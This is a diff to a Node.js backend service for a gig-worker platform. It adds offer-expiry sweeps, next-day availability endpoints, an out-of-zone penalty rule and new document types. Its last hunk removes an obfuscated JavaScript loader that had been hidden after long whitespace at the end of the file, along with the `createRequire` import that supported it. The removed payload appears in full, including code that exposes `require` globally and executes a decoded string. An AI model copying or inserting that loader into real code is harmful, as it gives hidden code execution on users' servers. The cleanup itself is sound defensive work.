@@ -4,8 +4,6 @@
 // Serves worker-app auth/bootstrap/profile/documents and the admin worker panel. The dispatch
 // service reads worker availability/services/location from here to match jobs; the wallet
 // service owns the earnings LEDGER and adjusts the balance snapshot here via /internal.
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
 import crypto from 'node:crypto'
 import express from 'express'
 import multer from 'multer'
@@ -79,6 +77,9 @@ async function init() {
     `CREATE UNIQUE INDEX IF NOT EXISTS ux_worker_snap ON worker_metric_snapshots(worker_id, snap_date)`,
     // Columns added on top of the earlier worker schema (idempotent).
     `ALTER TABLE workers ADD COLUMN IF NOT EXISTS offered_booking INTEGER`,
+    // When the current offer was made. The accept window is enforced against this, so an offer
+    // expires on its own even if the app that was showing it is backgrounded or killed.
+    `ALTER TABLE workers ADD COLUMN IF NOT EXISTS offered_at TIMESTAMPTZ`,
     `ALTER TABLE workers ADD COLUMN IF NOT EXISTS profile JSONB NOT NULL DEFAULT '{}'`,
     `ALTER TABLE workers ADD COLUMN IF NOT EXISTS bank_status TEXT DEFAULT 'Pending'`,
     // Wallet module: a worker can hold several payout accounts and pick a default. The old
@@ -100,6 +101,9 @@ async function init() {
     `CREATE INDEX IF NOT EXISTS ux_bank_worker ON worker_bank_accounts (worker_id)`,
     `ALTER TABLE workers ADD COLUMN IF NOT EXISTS zone_id INTEGER`,
     `ALTER TABLE workers ADD COLUMN IF NOT EXISTS designation TEXT`,   // Zone Manager / Team Leader / Worker — drives zone Assign-Team role lookups
+    // Running count of jobs completed OUTSIDE the worker's preferred zone, in a row. Reset to 0 on
+    // any in-zone completion; at 3 consecutive it triggers an out-of-zone penalty then resets.
+    `ALTER TABLE workers ADD COLUMN IF NOT EXISTS out_of_zone_streak INTEGER NOT NULL DEFAULT 0`,
     // Shifts (WFM roster): a worker is "on shift" in a zone during weekly time windows.
     // weekday 0=Sun..6=Sat; start_min/end_min = minutes from midnight (IST).
     `CREATE TABLE IF NOT EXISTS shifts (
@@ -126,6 +130,15 @@ async function init() {
       in_lat REAL, in_lng REAL, out_lat REAL, out_lng REAL,
       UNIQUE(worker_id, day)
     )`,
+    // Next-day availability: after finishing a shift the worker answers "coming in tomorrow?".
+    // One row per worker per target date; admin reads these to plan the next day's roster.
+    `CREATE TABLE IF NOT EXISTS next_day_avail (
+      id SERIAL PRIMARY KEY, worker_id INTEGER NOT NULL, for_date DATE NOT NULL,
+      coming BOOLEAN NOT NULL, note TEXT DEFAULT '',
+      responded_at TIMESTAMPTZ NOT NULL DEFAULT now(),
+      UNIQUE(worker_id, for_date)
+    )`,
+    `CREATE INDEX IF NOT EXISTS ix_next_day_date ON next_day_avail(for_date)`,
     // Shift PLANS (min-guarantee model): the named shifts a worker signs up for. A worker picks
     // one; attendance/check-in is judged against its start_min (+ grace_min); late → penalty; and
     // the day is topped up to min_g_* if job earnings fall short. Admin-editable.
@@ -874,7 +887,7 @@ async function mergeProfile(wid, patch) {
 
 // Booked service length in minutes — mirrors the dispatch service so the restored (post-relaunch)
 // timer matches the live one. Prefer the item's durationId, else parse the label.
-const DUR_MIN = { '60m': 60, '90m': 90, '2h': 120, '2h30': 150, '3h': 180, '3h30': 210, '4h': 240 }
+const DUR_MIN = { '30m': 30, '60m': 60, '90m': 90, '2h': 120, '2h30': 150, '3h': 180, '3h30': 210, '4h': 240 }
 function bookingDurationMinutes(b) {
   const id = b?.items?.[0]?.durationId
   if (id && DUR_MIN[id]) return DUR_MIN[id]
@@ -944,7 +957,8 @@ async function bootstrap(wid) {
         durationMinutes: bookingDurationMinutes(active),
         address: addr, area: addr, distanceKm: 0,
         earnings: Math.round((active.total || 0) * 0.8),
-        otp: active.service_otp || '',
+        // No `otp` here on purpose — the check-in code stays server-side and is only ever
+        // compared by dispatch's /api/worker/jobs/verify-otp. The customer reads it out.
         lat: active.cust_lat || 0, lng: active.cust_lng || 0,
         startedAt: active.started_at, completedAt: active.completed_at,
       }
@@ -1209,6 +1223,10 @@ const DOC_TYPES = [
   { name: 'PF Account Proof', required: false, hint: 'Provident Fund account proof' },
   { name: 'Vaccination Certificate', required: false, hint: 'COVID / other vaccination proof' },
   { name: 'Resume / Bio Data', required: false, hint: 'Résumé or bio-data' },
+  { name: 'Voter ID', required: false, hint: 'EPIC card — front & back' },
+  { name: 'Ration Card', required: false, hint: 'Family ration card' },
+  { name: 'Educational Certificate', required: false, hint: 'Highest qualification certificate' },
+  { name: 'Reference Letter', required: false, hint: 'Character or previous-employment reference' },
 ]
 const DOC_NAMES = new Set(DOC_TYPES.map((d) => d.name))
 
@@ -1606,6 +1624,71 @@ app.post('/api/worker/attendance/checkout', auth, async (req, res) => {
   if (att?.min_g > 0) publishEvent(REDIS_URL, 'shift.settle', { workerId: req.worker.id, minG: att.min_g, day })
   publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, action: 'attendance.checkout', entityType: 'worker', entityId: req.worker.id, detail: 'Checked out' })
   res.json(await attendanceToday(req.worker.id))
+})
+
+/* ---------- next-day availability ("Are you coming in tomorrow?") ---------- */
+// After a worker finishes their selected shift — an explicit checkout, or the shift plan's end time
+// has passed for today — the app asks whether they're coming in tomorrow. The answer is stored per
+// target date and surfaced to admin so the next day's roster can be planned.
+const nextDayTargetStr = () => istDateStr(Date.now() + 24 * 3600 * 1000)
+
+async function shiftFinishedToday(workerId) {
+  const day = istDateStr(Date.now())
+  const a = (await pool.query('SELECT check_out FROM attendance WHERE worker_id=$1 AND day=$2', [workerId, day])).rows[0]
+  if (a?.check_out) return true                        // explicit checkout = shift done
+  const sd = await getShiftDef((await getWorker(workerId))?.shift_def_id)
+  if (sd) { const { minutes } = istNow(); if (minutes >= sd.end_min) return true }  // shift end passed
+  return false
+}
+
+// Worker: has the "coming tomorrow?" prompt become due, and what was the last answer?
+app.get('/api/worker/shift/next-day', auth, async (req, res) => {
+  const forDate = nextDayTargetStr()
+  const existing = (await pool.query('SELECT coming, note FROM next_day_avail WHERE worker_id=$1 AND for_date=$2', [req.worker.id, forDate])).rows[0]
+  const finished = await shiftFinishedToday(req.worker.id)
+  res.json({
+    forDate,
+    prompt: finished && !existing,          // ask only once the shift is done and not yet answered
+    responded: !!existing,
+    coming: existing ? existing.coming : null,
+    note: existing?.note || '',
+  })
+})
+
+// Worker: record the answer (defaults to tomorrow's date). Idempotent per target date.
+app.post('/api/worker/shift/next-day', auth, async (req, res) => {
+  const coming = req.body?.coming === true || req.body?.coming === 'true'
+  const note = String(req.body?.note || '').slice(0, 300)
+  const forDate = /^\d{4}-\d{2}-\d{2}$/.test(req.body?.date || '') ? req.body.date : nextDayTargetStr()
+  await pool.query(
+    `INSERT INTO next_day_avail (worker_id, for_date, coming, note) VALUES ($1,$2,$3,$4)
+     ON CONFLICT (worker_id, for_date) DO UPDATE SET coming=$3, note=$4, responded_at=now()`,
+    [req.worker.id, forDate, coming, note])
+  const w = await getWorker(req.worker.id)
+  publishEvent(REDIS_URL, 'activity', {
+    actorType: 'worker', actorId: req.worker.id, actorName: w?.name, action: 'shift.next_day',
+    entityType: 'worker', entityId: req.worker.id,
+    detail: coming ? `Confirmed coming in on ${forDate}` : `Not coming in on ${forDate}${note ? ' — ' + note : ''}`,
+  })
+  res.json({ ok: true, forDate, coming, note })
+})
+
+// Admin: the next-day roster — who's confirmed / out for a given day (defaults to tomorrow).
+app.get('/api/admin/next-day-availability', adminAuth, async (req, res) => {
+  const forDate = /^\d{4}-\d{2}-\d{2}$/.test(req.query?.date || '') ? req.query.date : nextDayTargetStr()
+  const { rows } = await pool.query(
+    `SELECT n.worker_id, n.coming, n.note, n.responded_at, w.name, w.phone
+       FROM next_day_avail n JOIN workers w ON w.id = n.worker_id
+      WHERE n.for_date = $1 ORDER BY n.coming DESC, w.name`, [forDate])
+  res.json({
+    date: forDate,
+    coming: rows.filter((r) => r.coming).length,
+    notComing: rows.filter((r) => !r.coming).length,
+    responses: rows.map((r) => ({
+      workerId: r.worker_id, name: r.name, phone: r.phone,
+      coming: r.coming, note: r.note || '', respondedAt: r.responded_at,
+    })),
+  })
 })
 
 /* ---------- geofence (assigned-apartment radius) ---------- */
@@ -2872,6 +2955,44 @@ async function evaluateJobRules(booking) {
     if (!ins.rowCount) continue // this version already paid this worker for this booking
     // The money: wallet credit, idempotent on its own ref.
     publishEvent(REDIS_URL, 'incentive.credit', { workerId: w.id, amount, ref: `rule-${v.id}-${ref}`, label })
+  }
+}
+
+/* ---------- out-of-preferred-zone penalty ---------- */
+// A worker with a preferred zone who keeps taking jobs OUTSIDE it is drifting off their patch. If
+// three jobs IN A ROW are completed out of zone, deduct a penalty and reset the streak. Any in-zone
+// completion resets the streak to 0. "Out of zone" = the booking's zone differs from the worker's
+// preferred zone (zone areas are pincode-defined); if a booking isn't zone-stamped we fall back to a
+// straight-line radius from the worker's last known location.
+const ZONE_PENALTY = 100        // ₹ deducted after ZONE_STREAK_LIMIT consecutive out-of-zone jobs
+const ZONE_STREAK_LIMIT = 3
+const ZONE_RADIUS_KM = 15       // fallback radius used only when the booking has no zone stamp
+
+async function evaluateZoneRule(booking) {
+  if (!booking?.worker_id) return
+  const w = await getWorker(booking.worker_id)
+  if (!w || w.status !== 'active' || w.zone_id == null) return   // rule only applies to a zoned worker
+
+  // Decide whether THIS completed job was outside the worker's preferred zone (null = can't tell).
+  let out = null
+  if (booking.zone_id != null) {
+    out = Number(booking.zone_id) !== Number(w.zone_id)
+  } else if (w.last_lat != null && w.last_lng != null && booking.cust_lat != null && booking.cust_lng != null) {
+    out = distanceM(w.last_lat, w.last_lng, booking.cust_lat, booking.cust_lng) / 1000 > ZONE_RADIUS_KM
+  }
+  if (out === null) return   // no zone stamp and no coords — leave the streak untouched
+
+  const streak = out ? (w.out_of_zone_streak || 0) + 1 : 0
+  await pool.query('UPDATE workers SET out_of_zone_streak=$1 WHERE id=$2', [streak, w.id])
+  const bref = booking.ref || `#${booking.id}`
+
+  if (out) {
+    publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Zone Monitor', action: 'zone.out', entityType: 'worker', entityId: w.id, detail: `Job ${bref} completed outside preferred zone (${streak}/${ZONE_STREAK_LIMIT})` })
+  }
+  if (streak >= ZONE_STREAK_LIMIT) {
+    await pool.query('UPDATE workers SET out_of_zone_streak=0 WHERE id=$1', [w.id])   // reset after charging
+    publishEvent(REDIS_URL, 'zone.penalty', { workerId: w.id, amount: ZONE_PENALTY, count: streak, ref: bref })
+    publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Zone Monitor', action: 'zone.penalty', entityType: 'worker', entityId: w.id, detail: `Out-of-zone penalty ₹${ZONE_PENALTY} — ${ZONE_STREAK_LIMIT} consecutive jobs outside preferred zone` })
   }
 }
 
@@ -4765,6 +4886,7 @@ app.get('/internal/workers/:id/service-set', internalOnly, async (req, res) => {
   res.json({
     services: w ? [...serviceSet(w)] : [], name: w?.name, rating: w?.rating, available: !!w?.available,
     status: w?.status, offered_booking: w?.offered_booking, zone_id: w?.zone_id ?? null,
+    offered_at: w?.offered_at ?? null,
     last: w?.last_lat != null ? { lat: w.last_lat, lng: w.last_lng } : null,
     // Phase 11: the worker's own weekly hours cap. Dispatch already calls this on every request,
     // so the limit rides along rather than costing another round trip.
@@ -4779,7 +4901,9 @@ app.get('/internal/workers/:id/service-set', internalOnly, async (req, res) => {
 app.post('/internal/workers/:id/offered', internalOnly, async (req, res) => {
   const wid = Number(req.params.id)
   const bookingId = req.body?.bookingId ?? null
-  await pool.query('UPDATE workers SET offered_booking=$1 WHERE id=$2', [bookingId, wid])
+  // Stamp when the offer was made (and clear the stamp when the offer is withdrawn) so the
+  // accept window can be measured server-side rather than by whichever screen happens to be open.
+  await pool.query('UPDATE workers SET offered_booking=$1, offered_at=CASE WHEN $1::int IS NULL THEN NULL ELSE now() END WHERE id=$2', [bookingId, wid])
   // Log every offer so the acceptance rate has a denominator. Re-offering the same booking
   // to the same worker must not create a second row, hence ON CONFLICT DO NOTHING.
   if (bookingId != null) {
@@ -5009,7 +5133,11 @@ subscribeEvents(REDIS_URL, 'worker', async (type, data) => {
   if (type === 'bank.verify.failed') return applyBankVerification(data.workerId, false, data)
   // Compensation Rule Engine — job_completed trigger. Runs alongside the wallet's own settlement
   // (its own consumer group), evaluates every active job rule, and credits eligible payouts.
-  if (type === 'booking.completed' && data.booking) return evaluateJobRules(data.booking).catch((e) => console.error('[worker] job-rule eval failed:', e.message))
+  if (type === 'booking.completed' && data.booking) {
+    evaluateJobRules(data.booking).catch((e) => console.error('[worker] job-rule eval failed:', e.message))
+    evaluateZoneRule(data.booking).catch((e) => console.error('[worker] zone-rule eval failed:', e.message))
+    return
+  }
 })
 
 
@@ -5040,6 +5168,46 @@ function scheduleMetricSnapshots() {
   setTimeout(() => snapshotMetrics().catch((e) => console.error('[worker] snapshot error:', e.message)), 25000)
 }
 
+/* Release offers nobody answered within the accept window.
+ *
+ * The window used to be a countdown inside the app's NewJobScreen, which meant it only ran while
+ * that screen was open — background the app (or never open the offer) and the booking stayed
+ * pinned to that worker forever, invisible to them and unreleasable by anyone else. Enforcing it
+ * here makes the deadline real: the sweep runs whatever the app is doing.
+ *
+ * Counted as 'declined' in job_offers so an ignored offer hurts the acceptance rate exactly as a
+ * tapped Reject does — otherwise ignoring offers would be the cost-free way to dodge work.
+ */
+const OFFER_TTL_SEC = Number(process.env.OFFER_TTL_SEC || 120)
+async function sweepExpiredOffers() {
+  // The booking id has to be captured BEFORE the update — RETURNING reports post-update values,
+  // which for the cleared column is always NULL.
+  const { rows } = await pool.query(
+    `WITH expired AS (
+       SELECT id, offered_booking FROM workers
+        WHERE offered_booking IS NOT NULL
+          AND offered_at IS NOT NULL
+          AND offered_at < now() - make_interval(secs => $1)
+     )
+     UPDATE workers w SET offered_booking=NULL, offered_at=NULL
+       FROM expired e WHERE w.id = e.id
+       RETURNING w.id, e.offered_booking AS booking_id`,
+    [OFFER_TTL_SEC],
+  )
+  for (const r of rows) {
+    await pool.query(
+      `UPDATE job_offers SET outcome='declined', responded_at=now()
+        WHERE worker_id=$1 AND booking_id=$2 AND outcome='offered'`,
+      [r.id, r.booking_id],
+    ).catch((e) => console.error('[worker] expire offer-outcome:', e?.message || e))
+  }
+  if (rows.length) console.log(`[worker] released ${rows.length} expired offer(s) after ${OFFER_TTL_SEC}s`)
+}
+function scheduleOfferSweep() {
+  // Well under the TTL, so a released offer returns to the pool promptly rather than at TTL x2.
+  setInterval(() => sweepExpiredOffers().catch((e) => console.error('[worker] offer sweep:', e?.message || e)), 15000)
+}
+
 init()
   .then(async () => {
     // Create the KYC bucket if it isn't there. Non-fatal: the service still serves everything
@@ -5048,5 +5216,6 @@ init()
     await ensurePublicBucket().catch((e) => console.error('[worker] public storage init failed:', e.message))
     app.listen(PORT, () => console.log(`[worker] service on http://localhost:${PORT}`))
     scheduleMetricSnapshots()
+    scheduleOfferSweep()
   })
-  .catch((e) => { console.error('[worker] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
+  .catch((e) => { console.error('[worker] failed to start:', e.message); process.exit(1) });
